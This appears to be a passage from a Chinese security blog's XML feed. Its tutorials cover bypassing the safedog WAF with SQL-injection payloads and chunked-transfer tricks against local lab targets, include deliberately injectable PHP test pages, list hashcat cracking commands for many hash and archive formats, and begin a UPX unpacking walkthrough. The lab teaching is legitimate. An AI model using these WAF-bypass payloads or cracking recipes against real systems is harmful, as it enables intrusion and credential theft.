<li><a href="https://www.hackingarticles.in/hack-the-21ltr-scene-1-vm-boot-to-root/" target="_blank" rel="noopener">https://www.hackingarticles.in/hack-the-21ltr-scene-1-vm-boot-to-root/</a></li>
</ol>
]]></content>
      <tags>
        <tag>靶场</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>绕WAF之safedog</title>
    <url>/%E7%BB%95WAF%E4%B9%8Bsafedog/</url>
    <content><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol>
<li>任何防御或多或少都存在防护弱点，针对看起来坚不可摧的防御，尝试查找其弱点，才能改善防御，毕竟最有效的防御措施是进攻。——好像有点道理</li>
</ol>
<h2 id="0x10-环境"><a href="#0x10-环境" class="headerlink" title="0x10 环境"></a>0x10 环境</h2><ol>
<li>windows server 2008</li>
<li>phpstudy</li>
<li>safedog Apache 4.0.26550正式版</li>
<li>本地的网（靶）站（场），代码：</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/12.png" alt></li>
</ol>
<h2 id="0x20-测试and与or"><a href="#0x20-测试and与or" class="headerlink" title="0x20 测试and与or"></a>0x20 测试and与or</h2><ol>
<li>防火墙单项and、or测试</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/13.png" alt></li>
<li>正常访问：<a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/2.png" alt></li>
<li>开启拦截，带敏感关键字访问：and 1=1，拦截了</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/3.png" alt></li>
<li></li>
<li><strong>各种拦截测试</strong></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/5.png" alt></li>
<li>and 1</li>
<li>and 1=</li>
<li>and ‘=’</li>
<li>and ‘1’</li>
<li>and ‘a’</li>
<li>and ‘a’=’a’</li>
<li>and 1=11</li>
<li>and 2&gt;1</li>
<li>and 1*1</li>
<li>and 1*1=1</li>
<li>and 1+1</li>
<li>and 1+a</li>
<li>and 1^1</li>
<li>and <del>=</del></li>
<li>&amp;&amp; 1=1</li>
<li></li>
<li><strong>各种不拦截测试</strong></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/1.png" alt></li>
<li>and</li>
<li>and -0=-0</li>
<li>and ~1=~1</li>
<li>and -2&lt;-1</li>
<li>and !</li>
<li>and 1a</li>
<li>and 1a=</li>
<li>and a+1</li>
<li>and hex(1)</li>
<li>and ord(100)</li>
<li>and oct(100)</li>
<li>and bin(100)</li>
<li>&amp;&amp; true</li>
<li>&amp;&amp; false</li>
<li>|| true</li>
<li>|| false</li>
<li>and 0x01 &lt;&gt; 0x02</li>
<li>and 0x2 &lt;=&gt; 0x2</li>
<li>and 0x2 xor 0x1</li>
<li>and binary 1</li>
<li>and binary 0</li>
<li>and conv(0,3,2)</li>
<li>and conv(1,3,2)</li>
<li>and concat(1)</li>
<li>and concat(0)</li>
<li></li>
<li>使用各种函数</li>
<li>替换敏感字符例如：|、||、&amp;、&amp;&amp;、^、xor、/、*、！、&lt;&gt;、&lt;=&gt;等</li>
<li>以及它们的URL编码，如&amp;&amp;：%26%26（mysql支持&amp;&amp;、||，Oracle不支持）</li>
<li>关键字符大小写</li>
<li>用true或false代替1或0,1=1或1=0</li>
<li>注释：%23、#、–、– -、–+</li>
<li>/**/、/*!*/</li>
</ol>
<h2 id="0x30-order-by-测试"><a href="#0x30-order-by-测试" class="headerlink" title="0x30 order by 测试"></a>0x30 order by 测试</h2><ol>
<li>正常情况下，列数为3</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/9.png" alt></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/10.png" alt></li>
<li>开启safedog，拦截</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/11.png" alt></li>
<li><strong>内联绕过</strong></li>
<li><a href="http://192.168.100.3/sql.php?id=1/*!04400order" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1/*!04400order</a> by*/ 3</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/14.png" alt></li>
<li>匹配04400，爆破1位数到多位数能绕过的数字</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/15.png" alt></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/16.png" alt></li>
<li><strong>注释换行绕过</strong></li>
<li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> order%23%0aby 3</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/17.png" alt></li>
<li>爆破%00-%ff</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/18.png" alt></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/19.png" alt></li>
<li>其他注释</li>
<li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> order– -%0aby 3</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/20.png" alt></li>
</ol>
<h2 id="0x40-union-selct-测试"><a href="#0x40-union-selct-测试" class="headerlink" title="0x40 union selct 测试"></a>0x40 union selct 测试</h2><ol>
<li><strong>内联绕过</strong></li>
<li><a href="http://192.168.100.3/sql.php?id=1/*!04400union*//*!04400select*/1,2,3" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1/*!04400union*//*!04400select*/1,2,3</a></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/21.png" alt></li>
<li><strong>注释换行绕过</strong></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/22.png" alt></li>
<li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> union%23qwe%0aselect 1,2,3</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8Bsafedog/23.png" alt></li>
<li><strong>union all select</strong></li>
<li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> union%23%0aall select 1,2,3</li>
<li><strong>union distinct select</strong></li>
<li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> union distinct%23%0a select 1,2,3</li>
<li><strong>union distinctrow select</strong></li>
<li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> union distinctrow%23%0a select 1,2,3</li>
</ol>
<h2 id="0x50-查库表列数据"><a href="#0x50-查库表列数据" class="headerlink" title="0x50 查库表列数据"></a>0x50 查库表列数据</h2><ol>
<li><a href="http://192.168.100.3/sql.php?id=1" target="_blank" rel="noopener">http://192.168.100.3/sql.php?id=1</a> union all%23%0a select 1,2,database%23%0a(%0a)</li>
<li></li>
</ol>
<h2 id="0xF0-特殊字符"><a href="#0xF0-特殊字符" class="headerlink" title="0xF0 特殊字符"></a>0xF0 特殊字符</h2><pre><code>`
!
@
#
$
%
^
&amp;
*
()
_
+
{}
:
&quot;&quot;
&#39;&#39;
;
[]
/
?
.
&lt;
&gt;
,
~
·
\
|
=
-</code></pre><h2 id="0xFE-测试代码"><a href="#0xFE-测试代码" class="headerlink" title="0xFE 测试代码"></a>0xFE 测试代码</h2><pre><code>&lt;?php
    $id=$_GET[&#39;id&#39;];
    $conn=mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);
    if(!conn){
        die(&#39;Could not connect : &#39;.mysql_error());
    }
    mysql_select_db(&quot;security&quot;,$conn);
    $query=&quot;select username,password from users where id=&#39;$id&#39;;&quot;;
    $result=mysql_query($query) or die(&#39;&lt;pre&gt;.mysql_error().&lt;/pre&gt;&#39;);
    while($row=mysql_fetch_array($result)){
        echo &quot;username: &quot;.$row[0].&quot;&lt;br/&gt;&quot;.&quot;password: &quot;.$row[1];
        echo &quot;&lt;br/&gt;&quot;;
    }
    echo &quot;&lt;br/&gt;&quot;;
    echo $query;
    mysql_close($conn)
?&gt;</code></pre><pre><code>&lt;?php 
error_reporting(E_ALL^E_DEPRECATED);
$connect=mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);

if(!$connect)
{
    die(&quot;Could not connect: &quot;.mysql_error());
}
mysql_select_db(&quot;security&quot;,$connect);
$id=$_REQUEST[&#39;id&#39;];
$query=&quot;select * from users where id=$id&quot;;
$result=mysql_query($query);

while($row=mysql_fetch_array($result))
{
    echo $row[&#39;0&#39;].&quot; &quot;.$row[&#39;1&#39;].&quot; &quot;.$row[&#39;2&#39;];
    echo &quot;&lt;br /&gt;&quot;;
}
echo &quot;&lt;br /&gt;&quot;;
echo $query;
mysql_close($connect);
?&gt;</code></pre><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li>
<li><a href="https://louisnie.github.io/2019/07/04/%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/" target="_blank" rel="noopener">https://louisnie.github.io/2019/07/04/%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/</a></li>
</ol>
]]></content>
      <tags>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>绕WAF之分块传输</title>
    <url>/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/</url>
    <content><![CDATA[<h2 id="0x00-前排留言"><a href="#0x00-前排留言" class="headerlink" title="0x00 前排留言"></a>0x00 前排留言</h2><ol>
<li>只分析技术，不存在抹黑。</li>
</ol>
<h2 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h2><ol>
<li>win2008+phpstudy+靶场sqli_labs+dog_apache_免费版应用防火墙</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/1.png" alt></li>
<li>开启拦截之前，访问<a href="http://192.168.10.8/sqli-labs/Less-11/，登录窗账号输入&#39;" target="_blank" rel="noopener">http://192.168.10.8/sqli-labs/Less-11/，登录窗账号输入&#39;</a> or ‘1’=’1#，密码输入任意密码1，都能显示登录成功</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/2.png" alt></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/3.png" alt></li>
<li>查看关键代码</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/4.png" alt></li>
<li>账号密码输入之后，sql查询语句如下：</li>
<li>@$sql=”SELECT username, password FROM users WHERE username=’’ or ‘1’=’1#’ and password=’1’ LIMIT 0,1”; </li>
<li>#的作用就是注释了后面的内容’ and password=’1’ LIMIT 0,1”;</li>
<li>实际sql语句是：@$sql=”SELECT username, password FROM users WHERE username=’’ or ‘1’=’1#，所以恒成立</li>
<li>开启拦截之后，再登录试试，被拦截了</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/5.png" alt></li>
</ol>
<h2 id="0x02-日常请求"><a href="#0x02-日常请求" class="headerlink" title="0x02 日常请求"></a>0x02 日常请求</h2><ol>
<li>原理：使用http协议与服务器建立连接时，首先建立tcp连接（三次握手），再发送http数据包，burpsuite抓数据包就可以看到关键字段：Connection，数据发送完成后，值就是close，如果数据内容较大，超出一个http包的容量，则值为keep-alive，即保持连接，直至发送内容完毕。</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/6.png" alt></li>
<li>带敏感字符访问，被拦截</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/7.png" alt></li>
<li>复制整个被拦截的数据请求包，把敏感字符删除，再发送一次，显示正常的，然后把复制的请求包粘贴到post内容后</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/9.png" alt></li>
<li>然后把Connection的值改为keep-alive，把Update Connection-Length的默认勾选去掉，不勾选</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/8.png" alt></li>
<li>再发送请求包，看到两个响应包，一个正常，一个拦截</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/10.png" alt></li>
</ol>
<h2 id="0x03-尝试分块绕过"><a href="#0x03-尝试分块绕过" class="headerlink" title="0x03 尝试分块绕过"></a>0x03 尝试分块绕过</h2><ol>
<li>利用分块编码传输绕过，在请求头添加字段<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank" rel="noopener">Transfer-Encoding: chunked</a>，就是数据分块发送，Content-Length在这种情况下不被发送，而是在每个分块的开头需要加当前分块的长度，以16进制的形式表示，后面紧接\r\n（回车换行），之后是分块本身。终止块是一个长度为0的分块，空两行代表数据包结束。</li>
<li>开启前面不更新内容长度的设置，即勾选Update Connection-Length</li>
<li>发包被拦截</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/11.png" alt></li>
<li>分块，然后正常请求而不被拦截</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/12.png" alt></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/13.png" alt></li>
<li>现在使用常规的分块传输去绕过，会被WAF直接识别且拦截。</li>
</ol>
<h2 id="0x04-使用注释混淆分块数据包"><a href="#0x04-使用注释混淆分块数据包" class="headerlink" title="0x04 使用注释混淆分块数据包"></a>0x04 使用注释混淆分块数据包</h2><ol>
<li><a href="https://tools.ietf.org/html/rfc7230#section-3.3.1" target="_blank" rel="noopener">RFC 7230, section 3.3.1: Transfer-Encoding</a></li>
<li>通过;注释来混淆代码，干扰WAF识别</li>
<li><strong>例子</strong></li>
<li>Transfer-Encoding: chunked</li>
<li></li>
<li>7</li>
<li>abcdefg</li>
<li>7</li>
<li>hijklmn</li>
<li>1</li>
<li>a</li>
<li>9;qwead123</li>
<li>&amp;b=1 and</li>
<li>3;123qweasd</li>
<li>1=1</li>
<li>0</li>
<li></li>
<li></li>
</ol>
<h2 id="0x5-利用协议未覆盖与分块编码绕过"><a href="#0x5-利用协议未覆盖与分块编码绕过" class="headerlink" title="0x5 利用协议未覆盖与分块编码绕过"></a>0x5 利用协议未覆盖与分块编码绕过</h2><ol>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type" target="_blank" rel="noopener">Content-Type</a>，一般有application/x-www-form-urlencoded，multipart/form-data，text/plain三种。</li>
<li>multipart/form-data：表单数据编码为一条消息，每个控件对应消息的一部分。当WAF没有规则匹配该协议时，传输的数据就可被绕过。</li>
<li>自定义Content-Type: multipart/form-data; boundary=something</li>
<li>正常拦截</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/14.png" alt></li>
<li>正常分割（其实就是改变正文编码），还是拦截</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/15.png" alt></li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/16.png" alt></li>
<li>分块，正常</li>
<li><img src="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/17.png" alt></li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">https://www.freebuf.com/news/193659.html</a></li>
<li><a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">https://www.anquanke.com/post/id/169738</a></li>
</ol>
]]></content>
      <tags>
        <tag>WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>hashcat</title>
    <url>/hashcat/</url>
    <content><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol>
<li>hashcat号称世界上最快的密码破解，世界上第一个和唯一的基于GPGPU规则引擎，免费多GPU（高达128个GPU），多哈希，多操作系统（Linux和Windows本地二进制文件），多平台（OpenCL和CUDA支持），多算法，资源利用率低，基于字典攻击，支持分布式破解等等。</li>
</ol>
<h2 id="0x01-hashcat"><a href="#0x01-hashcat" class="headerlink" title="0x01 hashcat"></a>0x01 <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">hashcat</a></h2><ol>
<li>hashcat -h/--help #查看帮助信息</li>
<li><img src="/hashcat/2.png" alt></li>
<li><img src="/hashcat/5.png" alt></li>
<li><img src="/hashcat/3.png" alt></li>
<li><strong>MD5例子:</strong></li>
<li>hashcat64.exe -a 3 -m 0 –force 77a42b0ff9a96e60736db9ed3ad632c0 #明文密码：txtxtx，-a：破解方式，3代表爆破，-m：hash ID，0代表MD5，–force：忽视警告，77a42b0ff9a96e60736db9ed3ad632c0：MD5</li>
<li><img src="/hashcat/1.png" alt></li>
<li><strong>破解7为数字</strong></li>
<li>hashcat64.exe -a 3 -m 0 –force 522deb70218b46326766d77209164eda ?d?d?d?d?d?d?d</li>
<li><img src="/hashcat/4.png" alt></li>
<li></li>
<li><strong>6-8位数字</strong></li>
<li>hashcat64.exe -a 3 -m 0 –force 0197100d296692fdca8d706d3c0f011d –increment –increment-min=6 –increment-max=8 ?d?d?d?d?d?d?d?d</li>
<li><img src="/hashcat/7.png" alt></li>
<li></li>
<li><strong>由0123456789abcdef组成的12位</strong></li>
<li>hashcat64.exe -a 3 -m 0 –force 0a3b74fc33bec931869c8b030df73e17 –increment –increment-min=8 –increment-max=12 ?h?h?h?h?h?h?h?h?h?h?h?h</li>
<li>等很久，图略</li>
<li></li>
<li><strong>特定字符集：123456abcdf!@+-</strong></li>
<li>hashcat64.exe -a 3 -1 123456abcdf!@+- d192b4f361f6895c3f9be590d432d79f ?1?1?1?1?1?1</li>
<li>-1和?1，是数字1</li>
<li><img src="/hashcat/8.png" alt></li>
<li></li>
<li><strong>6-8为位符集:123456abcdf!@.</strong></li>
<li>hashcat64.exe -a 3 -1 123456abcdf!@. 94c3dac6b27b48548ce5817cf05d247c –increment –increment-min=6 –increment-max=8 ?1?1?1?1?1?1?1?1</li>
<li><img src="/hashcat/9.png" alt></li>
<li></li>
<li><strong>6-8位数字+大小写字母+特殊符号</strong></li>
<li>hashcat64.exe -a 3 -1 ?d?u?l?s 07ff38269731a5d483d7fa58eb0f522f –increment –increment-min 6 –increment-max 8 ?1?1?1?1?1?1</li>
<li>或者：</li>
<li>hashcat64.exe -a 3 07ff38269731a5d483d7fa58eb0f522f –increment –increment-min 6 –increment-max 8 ?a?a?a?a?a?a</li>
<li><img src="/hashcat/10.png" alt></li>
<li></li>
<li><strong>字典破解</strong></li>
<li>hashcat64.exe -a 0 07787964a1e74335c923a46348e1e865 pass.txt (-o result.txt) #-a 0是指定字典破解模式，-o是输出结果到文件中</li>
<li><img src="/hashcat/11.png" alt></li>
<li></li>
<li><strong>批量破解</strong></li>
<li>hashcat64.exe -a 0 hash.txt pass.txt -o result.txt</li>
<li></li>
<li><strong>字典组合破解</strong></li>
<li>hashcat64.exe -a 1 e3274be5c857fb42ab72d786e281b4b8 pass1.txt pass2.txt</li>
<li><img src="/hashcat/12.png" alt></li>
<li></li>
<li><strong>字典+掩码破解</strong></li>
<li>hashcat64.exe -a 6 9dc9d5ed5031367d42543763423c24ee pass.txt ?l?l?l?l?l</li>
<li></li>
<li><strong>Mysql4.1/5的PASSWORD函数</strong></li>
<li>hashcat64.exe -a 3 -m 300 –force 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B (?d?d?d?d?d?d可有可无)</li>
<li><img src="/hashcat/13.png" alt></li>
<li><img src="/hashcat/14.png" alt></li>
<li></li>
<li><strong>sha512crypt $6$, SHA512 (Unix)破解</strong></li>
<li>hashcat64.exe -a 3 -m 1800 –force $6$GlrSybQA$1AHDMq.ga2QZjmUAHv8eFF4yxJR4X8IjbKBLiXXY8tWH407oYgpPs9f0.ZJTN5KkUx7x.fINKBQWgl6ycDFMy1</li>
<li><strong>使用–username</strong></li>
<li>hashcat64.exe -a 3 -m 1800 –force testv:$6$Q3ckMJT8ba3IGcRC$cWAeECECSdxwdi3tBDIz9OvxWyDFPjS2Ostt77xJZK8ruTOkj4chwl/AOLIHbkgqw/WA.bIBzFnQJgLlaqlAm/ –username</li>
<li></li>
<li><strong>Windows NT-hash，LM-hash破解</strong></li>
<li>NT-hash:</li>
<li>hashcat64.exe -a 3 -m 1000 209C6174DA490CAEB422F3FA5A7AE634 ?l?l?l?l?l</li>
<li>LM-hash:</li>
<li>hashcat64.exe -a 3 -m 3000 F0D412BD764FFE81AAD3B435B51404EE ?l?l?l?l?l</li>
<li></li>
<li><strong>mssql</strong></li>
<li>hashcat64.exe -a 3 -m 132 –force 0x01008c8006c224f71f6bf0036f78d863c3c4ff53f8c3c48edafb ?l?l?l?l?l?d?d?d</li>
<li></li>
<li><strong>wordpress密码hash破解</strong></li>
<li>hashcat64.exe -a 3 -m 400 –force $P$BYEYcHEj3vDhV1lwGBv6rpxurKOEWY/ ?d?d?d?d?d?d</li>
<li></li>
<li><strong>discuz用户密码hash破解</strong>其密码加密方式md5(md5($pass).$salt)</li>
<li>hashcat64.exe -a 3 -m 2611 –force 14e1b600b1fd579f47433b88e8d85291: ?d?d?d?d?d?d</li>
<li></li>
<li><strong>破解RAR压缩密码</strong></li>
<li>rar2john获取rar文件hash值：rar2john.exe 1.rar</li>
<li>1.rar:$rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e</li>
<li>hashcat64.exe -a 3 -m 13000 –force $rar5$16$639e9ce8344c680da12e8bdd4346a6a3$15$a2b056a21a9836d8d48c2844d171b73d$8$04a52d2224ad082e ?d?d?d?d?d?d</li>
<li></li>
<li><strong>zip密码破解</strong></li>
<li>zip2john获取文件的hash值：zip2john.exe 1.zip</li>
<li>结果：1.zip:$zip2$<em>0</em>3<em>0</em>554bb43ff71cb0cac76326f292119dfd<em>ff23<em>5</em>24b28885ee*d4fe362bb1e91319ab53</em>$/zip2$:::::1.zip-1.txt</li>
<li>hashcat64.exe -a 3 -m 13600 $zip2$<em>0</em>3<em>0</em>554bb43ff71cb0cac76326f292119dfd<em>ff23<em>5</em>24b28885ee*d4fe362bb1e91319ab53</em>$/zip2$ –force ?d?d?d?d?d?d</li>
<li></li>
<li><strong>破解office密码</strong></li>
<li>office的hash值：python office2john.py 11.docx</li>
<li>结果：11.docx:$office$<em>2013</em>100000<em>256</em>16<em>e4a3eb62e8d3576f861f9eded75e0525</em>9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9</li>
<li>hashcat64.exe -a 3 -m 9600 $office$<em>2013</em>100000<em>256</em>16<em>e4a3eb62e8d3576f861f9eded75e0525</em>9eeb35f0849a7800d48113440b4bbb9c*577f8d8b2e1c5f60fed76e62327b38d28f25230f6c7dfd66588d9ca8097aabb9 –force ?d?d?d?d?d?d</li>
<li></li>
<li><strong>破解WIFI密码</strong></li>
<li>官方在线转化<a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="noopener">https://hashcat.net/cap2hccapx/</a></li>
<li>hashcat64.exe -a 3 -m 2500 1.hccapx 1391040?d?d?d?d</li>
</ol>
<h2 id="0x02-其他"><a href="#0x02-其他" class="headerlink" title="0x02 其他"></a>0x02 其他</h2><ol>
<li>爆破过的结果会保存在hashcat.profile文件中</li>
<li>hashcat64.exe 要破解hash值 –show #查看是否破解过，有则显示结果</li>
<li>破解过程时间长时，按s查看状态，p暂停，r继续破解，q退出</li>
<li>使用GPU模式进行破解时，使用-O参数自动进行优化</li>
</ol>
<h2 id="0x03-hash-ID列表"><a href="#0x03-hash-ID列表" class="headerlink" title="0x03 hash ID列表"></a>0x03 hash ID列表</h2><p><img src="/hashcat/6.png" alt></p>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://blog.csdn.net/SHIGUANGTUJING/article/details/90074614" target="_blank" rel="noopener">https://blog.csdn.net/SHIGUANGTUJING/article/details/90074614</a></li>
</ol>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>脱壳一</title>
    <url>/%E8%84%B1%E5%A3%B3/</url>
    <content><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol>
<li>工具：PEID（查壳）、OllyDbg（调试）、OllyDbg自带的插件（脱壳）、LordPE（脱壳）、ImportREC（修复）</li>
<li>加壳的程序</li>
</ol>
<h2 id="0x10-UPX壳"><a href="#0x10-UPX壳" class="headerlink" title="0x10 UPX壳"></a>0x10 UPX壳</h2><ol>
<li>UPX：压缩壳</li>
</ol>
<h3 id="0x11-单步跟踪法"><a href="#0x11-单步跟踪法" class="headerlink" title="0x11 单步跟踪法"></a>0x11 单步跟踪法</h3><ol start="5">
<li>查壳</li>
<li><img src="/%E8%84%B1%E5%A3%B3/1.png" alt></li>
<li>OD载入</li>
<li><img src="/%E8%84%B1%E5%A3%B3/2.png" alt></li>
<li>单步步过（快捷键F8）</li>
<li><img src="/%E8%84%B1%E5%A3%B3/3.png" alt></li>
<li>红线代表已经实现，绿线代表没实现，向下的红线让它跳转（继续F8），向上的红线禁止它跳转（点击下一行，右击——断点——运行到选定的位置F4）（也可以选定下一行，右击——断点——切换（快捷键F2），点击运行（F9），再右击——断点——切换（快捷键F2），即点击下一行，按F2-F9-F2）</li>
<li><img src="/%E8%84%B1%E5%A3%B3/4.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/5.png" alt></li>
<li>碰到下一行也是跳转，就点击下下一行</li>
<li><img src="/%E8%84%B1%E5%A3%B3/6.png" alt></li>
<li>碰到一个jmp跳转，但是下一个是call，所以到下下一行</li>
<li><img src="/%E8%84%B1%E5%A3%B3/7.png" alt></li>
<li>关键命令：popad，出栈命令，下一行是个jmp，跳转的跨度很大</li>
<li><img src="/%E8%84%B1%E5%A3%B3/8.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/9.png" alt></li>
<li>这就是程序入口点（OEP）</li>
<li>使用OllyDbg自带的插件来脱壳，两种方式</li>
<li><img src="/%E8%84%B1%E5%A3%B3/10.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/11.png" alt></li>
<li>使用两种方式脱壳，点击脱壳，随意命名为1.exe和2.exe</li>
<li>使用LordPE来脱壳，打开LordPE，找到目的程序，右击——修正镜像大小——右击——完全转存——随意命名为3.exe</li>
<li><img src="/%E8%84%B1%E5%A3%B3/12.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/13.png" alt></li>
<li>查看已脱壳的3个程序</li>
<li><img src="/%E8%84%B1%E5%A3%B3/14.png" alt></li>
<li>查壳</li>
<li><img src="/%E8%84%B1%E5%A3%B3/15.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/16.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/17.png" alt></li>
<li>1.exe和2.exe都能正常运行</li>
<li><img src="/%E8%84%B1%E5%A3%B3/18.png" alt></li>
<li>3.exe不能正常运行</li>
<li><img src="/%E8%84%B1%E5%A3%B3/19.png" alt></li>
<li>使用ImportREC修复转存文件——运行——找到目的程序——修改OEP为OD里OEP地址减去基址00400000，即7738C——自动查找IAT——获取输入表——无效函数（这里无）——转储到文件——选3.exe——就多了新程序3_.exe</li>
<li><img src="/%E8%84%B1%E5%A3%B3/20.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/21.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/22.png" alt></li>
<li>再来查壳</li>
<li><img src="/%E8%84%B1%E5%A3%B3/23.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/24.png" alt></li>
<li>运行正常</li>
<li><img src="/%E8%84%B1%E5%A3%B3/25.png" alt></li>
</ol>
<h3 id="0x12-ESP定律法"><a href="#0x12-ESP定律法" class="headerlink" title="0x12 ESP定律法"></a>0x12 ESP定律法</h3><ol>
<li>pushad，入栈命令，关注寄存器位置</li>
<li><img src="/%E8%84%B1%E5%A3%B3/26.png" alt></li>
<li>单步步过F8（一般是关键命令的下一个命令），ESP突变</li>
<li><img src="/%E8%84%B1%E5%A3%B3/27.png" alt></li>
<li>点击ESP数值，右击——数据窗口中跟随——来到数据窗口——选地址为ESP数值的地址——断点——设置硬件访问断点（word或dword）——运行F9——来到了jmp，注意前面的命令：popad，出栈——再F8就来到OEP</li>
<li><img src="/%E8%84%B1%E5%A3%B3/28.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/29.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/30.png" alt></li>
<li><img src="/%E8%84%B1%E5%A3%B3/31.png" alt></li>
